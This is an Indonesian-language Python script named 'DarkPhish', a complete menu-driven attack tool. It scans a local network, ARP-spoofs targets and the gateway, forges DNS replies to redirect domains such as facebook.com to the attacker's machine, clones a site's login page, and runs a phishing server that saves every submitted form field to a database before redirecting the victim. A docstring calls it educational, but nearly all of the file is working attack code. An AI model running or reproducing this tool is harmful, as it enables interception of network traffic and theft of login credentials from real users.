#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Pastikan semua library ini sudah terinstal:
# pip install scapy colorama netifaces requests tabulate

import scapy.all as scapy
import time
import requests
import os
import sys
import logging
import http.server
import socketserver
import urllib.parse
import sqlite3
import subprocess
import netifaces
import threading
from urllib.parse import urlparse
from tabulate import tabulate
from colorama import init, Fore, Style

# Inisialisasi colorama untuk warna di terminal
init(autoreset=True)

class DarkPhish:
    """
    DarkPhish adalah sebuah tool untuk tujuan edukasi keamanan siber.
    Fokus pada pemahaman cara kerja ARP spoofing, DNS spoofing, dan phishing.
    Gunakan tool ini secara bertanggung jawab dan hanya pada jaringan yang Anda miliki izinnya.
    """
    def __init__(self, interface):
        self.interface = interface
        self.spoofing = False
        self.httpd = None
        self.dns_rules = []
        self.script_dir = os.path.dirname(os.path.realpath(__file__))
        self.log_file = os.path.join(self.script_dir, "darkphish.log")
        self.db_file = os.path.join(self.script_dir, "phishing_data.db")
        self.clone_dir = os.path.join(self.script_dir, "cloned_website")
        
        # Setup logging
        logging.basicConfig(filename=self.log_file, level=logging.INFO,
                            format='%(asctime)s - %(levelname)s - %(message)s')
        
        # Mendapatkan IP address dari interface yang dipilih
        try:
            self.phishing_ip = netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']
        except (KeyError, IndexError):
            print(f"{Fore.RED}[!] Gagal mendapatkan IP address untuk interface '{self.interface}'. Pastikan interface terhubung ke jaringan.")
            sys.exit(1)

    # =================================================================
    # Bagian Utilitas Jaringan
    # =================================================================
    def get_mac(self, ip):
        """Mendapatkan MAC address dari sebuah IP address."""
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=2, iface=self.interface, verbose=False)[0]
            if answered_list:
                return answered_list[0][1].hwsrc
        except Exception as e:
            logging.error(f"Error saat get_mac untuk {ip}: {e}")
        return None

    def scan_network(self, ip_range):
        """Memindai jaringan untuk menemukan perangkat aktif."""
        print(f"\n{Fore.CYAN}[*] Memindai jaringan di {ip_range}...")
        logging.info(f"Memulai pemindaian jaringan pada range: {ip_range}")
        
        arp_request = scapy.ARP(pdst=ip_range)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        
        try:
            answered_list = scapy.srp(arp_request_broadcast, timeout=5, iface=self.interface, verbose=False)[0]
        except Exception as e:
            print(f"{Fore.RED}[!] Terjadi error saat memindai: {e}")
            logging.error(f"Error saat scapy.srp: {e}")
            return []

        devices = []
        for element in answered_list:
            vendor = self.get_vendor(element[1].hwsrc)
            device = {"ip": element[1].psrc, "mac": element[1].hwsrc, "vendor": vendor}
            devices.append(device)
        
        logging.info(f"Ditemukan {len(devices)} perangkat aktif.")
        return devices

    def get_vendor(self, mac_address):
        """Mendapatkan nama vendor dari MAC address menggunakan API."""
        try:
            response = requests.get(f"https://api.macvendors.com/{mac_address}", timeout=3)
            if response.status_code == 200:
                return response.text
            return "Unknown"
        except requests.RequestException:
            return "N/A (API Error)"

    # =================================================================
    # Bagian Spoofing
    # =================================================================
    def spoof(self, target_ip, target_mac, spoof_ip):
        """Mengirim satu paket ARP spoof."""
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, iface=self.interface, verbose=False)

    def restore_arp(self, dest_ip, dest_mac, src_ip, src_mac):
        """Mengembalikan tabel ARP ke kondisi normal."""
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
        scapy.send(packet, count=4, iface=self.interface, verbose=False)

    def handle_dns_packet(self, packet):
        """Menangani paket DNS dan mengirim balasan palsu jika cocok."""
        if packet.haslayer(scapy.DNSQR) and self.spoofing:
            qname = packet[scapy.DNSQR].qname.decode().rstrip('.')
            for domain, ip in self.dns_rules:
                if domain in qname:
                    logging.info(f"Menangkap query DNS untuk {qname}, dialihkan ke {ip}")
                    print(f"{Fore.GREEN}[+] DNS Query terdeteksi: {qname} -> {ip}")
                    
                    spoofed_packet = (
                        scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst) /
                        scapy.UDP(dport=packet[scapy.UDP].sport, sport=53) /
                        scapy.DNS(
                            id=packet[scapy.DNS].id, qr=1, aa=1,
                            qd=packet[scapy.DNS].qd,
                            an=scapy.DNSRR(rrname=packet[scapy.DNS].qd.qname, ttl=60, rdata=ip)
                        )
                    )
                    scapy.send(spoofed_packet, iface=self.interface, verbose=False)
                    break

    def start_spoofing_threads(self, targets, gateway_ip, gateway_mac):
        """Memulai thread untuk ARP dan DNS spoofing."""
        self.spoofing = True
        
        # Thread untuk ARP Spoofing
        def arp_spoof_loop():
            sent_packets_count = 0
            while self.spoofing:
                for target_ip, target_mac in targets:
                    self.spoof(target_ip, target_mac, gateway_ip)
                    self.spoof(gateway_ip, gateway_mac, target_ip)
                    sent_packets_count += 2
                print(f"\r{Fore.YELLOW}[*] ARP Spoofing berjalan... Paket terkirim: {sent_packets_count}", end="")
                time.sleep(2)
        
        # Thread untuk DNS Spoofing
        def dns_spoof_loop():
            print(f"{Fore.YELLOW}[*] DNS Spoofing berjalan... Menunggu query DNS.")
            scapy.sniff(iface=self.interface, filter="udp port 53", prn=self.handle_dns_packet, store=0, stop_filter=lambda p: not self.spoofing)

        arp_thread = threading.Thread(target=arp_spoof_loop, daemon=True)
        dns_thread = threading.Thread(target=dns_spoof_loop, daemon=True)
        
        arp_thread.start()
        dns_thread.start()

        try:
            while self.spoofing:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Interupsi diterima. Menghentikan spoofing...")
            self.stop_spoofing(targets, gateway_ip, gateway_mac)

    def stop_spoofing(self, targets, gateway_ip, gateway_mac):
        """Menghentikan semua aktivitas spoofing dan memulihkan jaringan."""
        self.spoofing = False
        print(f"\n{Fore.GREEN}[+] Mengembalikan tabel ARP... Harap tunggu.")
        logging.info("Menghentikan spoofing dan memulihkan ARP.")
        for target_ip, target_mac in targets:
            self.restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
            self.restore_arp(gateway_ip, gateway_mac, target_ip, target_mac)
        print(f"{Fore.GREEN}[+] Jaringan telah dipulihkan.")

    # =================================================================
    # Bagian Phishing Server
    # =================================================================
    def clone_website(self, url):
        """Mengkloning halaman HTML dari sebuah URL."""
        print(f"\n{Fore.CYAN}[*] Mengkloning website dari: {url}")
        logging.info(f"Mencoba kloning website: {url}")
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
            response = requests.get(url, timeout=10, headers=headers, allow_redirects=True)
            response.raise_for_status()
            
            os.makedirs(self.clone_dir, exist_ok=True)
            file_path = os.path.join(self.clone_dir, "index.html")
            
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(response.text)
            
            print(f"{Fore.GREEN}[+] Website berhasil disimpan di: {file_path}")
            logging.info(f"Website berhasil dikloning ke {file_path}")
        except requests.RequestException as e:
            print(f"{Fore.RED}[!] Gagal mengkloning website: {e}")
            logging.error(f"Gagal kloning website {url}: {e}")

    def run_phishing_server(self, port=80, redirect_url="https://google.com"):
        """Menjalankan server HTTP untuk menyajikan halaman phishing."""
        if not os.path.exists(os.path.join(self.clone_dir, "index.html")):
            print(f"{Fore.RED}[!] File 'index.html' tidak ditemukan di direktori '{self.clone_dir}'.")
            print(f"{Fore.YELLOW}[*] Silakan kloning website terlebih dahulu (Menu 3).")
            return

        # Setup database
        conn = sqlite3.connect(self.db_file)
        conn.execute("CREATE TABLE IF NOT EXISTS credentials (id INTEGER PRIMARY KEY, data TEXT, timestamp TEXT)")
        conn.commit()

        class PhishingHandler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory=self.clone_dir, **kwargs)

            def do_POST(self):
                try:
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length).decode('utf-8')
                    
                    # Simpan semua data form
                    conn.execute("INSERT INTO credentials (data, timestamp) VALUES (?, datetime('now'))", (post_data,))
                    conn.commit()
                    
                    print(f"\n{Fore.GREEN}[+] Kredensial atau data form berhasil ditangkap!")
                    print(f"{Fore.WHITE}{urllib.parse.unquote_plus(post_data)}")
                    logging.info(f"Data ditangkap: {post_data}")
                    
                    # Redirect korban ke halaman lain
                    self.send_response(302)
                    self.send_header('Location', redirect_url)
                    self.end_headers()
                except Exception as e:
                    logging.error(f"Gagal memproses POST request: {e}")
                    self.send_response(500)
                    self.end_headers()

        try:
            self.httpd = socketserver.TCPServer(("", port), PhishingHandler)
            print(f"\n{Fore.GREEN}[+] Server Phishing berjalan di http://{self.phishing_ip}:{port}")
            logging.info(f"Server phishing dimulai di port {port}")
            self.httpd.serve_forever()
        except OSError as e:
            print(f"{Fore.RED}[!] Gagal menjalankan server di port {port}: {e}")
            logging.error(f"Gagal menjalankan server di port {port}: {e}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Menghentikan server phishing...")
        finally:
            if self.httpd:
                self.httpd.server_close()
            conn.close()
            logging.info("Server phishing dihentikan.")

    def view_captured_data(self):
        """Menampilkan data yang sudah ditangkap dari database."""
        if not os.path.exists(self.db_file):
            print(f"{Fore.YELLOW}[!] Database tidak ditemukan. Belum ada data yang ditangkap.")
            return
        
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute("SELECT id, data, timestamp FROM credentials ORDER BY timestamp DESC")
        rows = cursor.fetchall()
        conn.close()

        if not rows:
            print(f"{Fore.YELLOW}[!] Belum ada data yang tersimpan.")
            return
        
        print(f"\n{Fore.GREEN}--- Data yang Berhasil Ditangkap ---")
        headers = [f"{Fore.CYAN}ID", f"{Fore.CYAN}Data Form", f"{Fore.CYAN}Waktu"]
        table_data = []
        for row in rows:
            # Mengubah data form menjadi lebih mudah dibaca
            parsed_data = urllib.parse.parse_qs(row[1])
            formatted_data = "\n".join([f"{k}: {v[0]}" for k, v in parsed_data.items()])
            table_data.append([row[0], formatted_data, row[2]])
        
        print(tabulate(table_data, headers=headers, tablefmt="grid"))
        print(f"{Fore.GREEN}------------------------------------")

# =================================================================
# Fungsi Utama dan Tampilan Menu
# =================================================================
def print_banner():
    """Mencetak banner aplikasi."""
    banner = r"""
    ██████╗  █████╗ ██████╗ ██╗  ██╗   ██████╗ ██╗   ██╗██╗███████╗
    ██╔══██╗██╔══██╗██╔══██╗██║  ╚██╗ ██╔═══██╗██║   ██║██║██╔════╝
    ██║  ██║███████║██████╔╝██║   ╚██╗██║   ██║██║   ██║██║███████╗
    ██║  ██║██╔══██║██╔══██╗██║   ██╔╝██║   ██║██║   ██║██║╚════██║
    ██████╔╝██║  ██║██║  ██║███████╔╝ ╚██████╔╝╚██████╔╝██║███████║
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═════╝  ╚═════╝ ╚═╝╚══════╝
    """
    print(f"{Fore.BLUE}{Style.BRIGHT}{banner}")
    print(f"{Fore.CYAN}{Style.BRIGHT.center(70, ' ')}Create By: Ibar | Revamped Version")
    print("-" * 70)

def select_interface():
    """Memilih interface jaringan yang akan digunakan."""
    interfaces = netifaces.interfaces()
    if not interfaces:
        print(f"{Fore.RED}[!] Tidak ada interface jaringan yang ditemukan.")
        sys.exit(1)
        
    print(f"{Fore.YELLOW}[*] Silakan pilih interface jaringan yang terhubung:")
    for i, iface in enumerate(interfaces, 1):
        try:
            ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
            print(f"  {Fore.GREEN}{i}. {iface} ({ip})")
        except (KeyError, IndexError):
            print(f"  {Fore.RED}{i}. {iface} (Tidak ada IP)")

    while True:
        try:
            choice = int(input(f"\n{Fore.WHITE}>> Masukkan nomor pilihan: "))
            if 1 <= choice <= len(interfaces):
                return interfaces[choice - 1]
            else:
                print(f"{Fore.RED}[!] Pilihan tidak valid.")
        except (ValueError, IndexError):
            print(f"{Fore.RED}[!] Masukkan hanya nomor.")

def main():
    """Fungsi utama untuk menjalankan aplikasi."""
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] Tool ini memerlukan hak akses root. Coba jalankan dengan 'sudo python3 script.py'")
        sys.exit(1)

    print_banner()
    interface = select_interface()
    darkphish = DarkPhish(interface)
    
    # Mendapatkan IP Gateway secara otomatis
    try:
        gateways = netifaces.gateways()
        gateway_ip = gateways['default'][netifaces.AF_INET][0]
        print(f"{Fore.GREEN}[+] Gateway terdeteksi: {gateway_ip}")
    except (KeyError, IndexError):
        gateway_ip = input(f"{Fore.YELLOW}[?] Tidak dapat mendeteksi gateway. Masukkan IP gateway secara manual: ")

    while True:
        print("\n" + "=" * 30 + " MENU UTAMA " + "=" * 30)
        print(f"{Fore.CYAN}1. Pindai Jaringan (Scan Network)")
        print(f"{Fore.CYAN}2. Mulai Serangan DNS Spoofing")
        print("-" * 25)
        print(f"{Fore.CYAN}3. Kloning Website (untuk Phishing)")
        print(f"{Fore.CYAN}4. Jalankan Server Phishing")
        print(f"{Fore.CYAN}5. Lihat Data yang Ditangkap")
        print("-" * 25)
        print(f"{Fore.RED}6. Keluar")
        print("=" * 72)
        
        choice = input(f"{Fore.WHITE}>> Pilih menu (1-6): ")

        if choice == "1":
            ip_range = f"{'.'.join(gateway_ip.split('.')[:3])}.1/24"
            devices = darkphish.scan_network(ip_range)
            if devices:
                headers = [f"{Fore.CYAN}IP Address", f"{Fore.CYAN}MAC Address", f"{Fore.CYAN}Vendor"]
                table_data = [[d['ip'], d['mac'], d['vendor']] for d in devices]
                print(f"\n{Fore.GREEN}--- Perangkat Aktif di Jaringan ---")
                print(tabulate(table_data, headers=headers, tablefmt="fancy_grid"))
            else:
                print(f"{Fore.YELLOW}[!] Tidak ada perangkat aktif yang ditemukan.")

        elif choice == "2":
            print("\n--- Konfigurasi DNS Spoofing ---")
            # Pilih target
            targets_input = input(f"{Fore.WHITE}>> Masukkan IP target (bisa lebih dari satu, pisahkan dengan koma): ")
            target_ips = [ip.strip() for ip in targets_input.split(',')]
            
            targets = []
            for ip in target_ips:
                mac = darkphish.get_mac(ip)
                if mac:
                    targets.append((ip, mac))
                    print(f"{Fore.GREEN}[+] Target ditemukan: {ip} ({mac})")
                else:
                    print(f"{Fore.RED}[!] Gagal mendapatkan MAC untuk {ip}. Target ini akan dilewati.")
            
            if not targets:
                print(f"{Fore.RED}[!] Tidak ada target valid yang bisa diserang.")
                continue

            gateway_mac = darkphish.get_mac(gateway_ip)
            if not gateway_mac:
                print(f"{Fore.RED}[!] Gagal mendapatkan MAC gateway. Serangan tidak bisa dilanjutkan.")
                continue
            
            # Atur aturan DNS
            darkphish.dns_rules = []
            print(f"\n{Fore.YELLOW}[*] Masukkan aturan pengalihan DNS. Biarkan kosong untuk selesai.")
            while True:
                domain = input(f"{Fore.WHITE}   - Domain yang akan dialihkan (misal: facebook.com): ")
                if not domain:
                    break
                ip_tujuan = input(f"{Fore.WHITE}   - Alihkan ke IP (default: {darkphish.phishing_ip}): ") or darkphish.phishing_ip
                darkphish.dns_rules.append((domain, ip_tujuan))
                print(f"{Fore.GREEN}   [+] Aturan ditambahkan: {domain} -> {ip_tujuan}")

            if darkphish.dns_rules:
                print(f"\n{Fore.GREEN}[+] Memulai serangan... Tekan CTRL+C untuk berhenti.")
                darkphish.start_spoofing_threads(targets, gateway_ip, gateway_mac)
            else:
                print(f"{Fore.RED}[!] Tidak ada aturan DNS yang dibuat. Serangan dibatalkan.")

        elif choice == "3":
            url = input(f"{Fore.WHITE}>> Masukkan URL lengkap untuk dikloning (contoh: https://facebook.com): ")
            darkphish.clone_website(url)
            
        elif choice == "4":
            try:
                port = int(input(f"{Fore.WHITE}>> Masukkan port untuk server (default: 80): ") or 80)
                redirect_url = input(f"{Fore.WHITE}>> Masukkan URL redirect setelah login (default: https://google.com): ") or "https://google.com"
                darkphish.run_phishing_server(port, redirect_url)
            except ValueError:
                print(f"{Fore.RED}[!] Port harus berupa angka.")
        
        elif choice == "5":
            darkphish.view_captured_data()

        elif choice == "6":
            print(f"{Fore.YELLOW}[*] Terima kasih telah menggunakan DarkPhish. Keluar...")
            sys.exit(0)
            
        else:
            print(f"{Fore.RED}[!] Pilihan tidak valid. Silakan coba lagi.")

if __name__ == "__main__":
    os.system('clear')
    main()
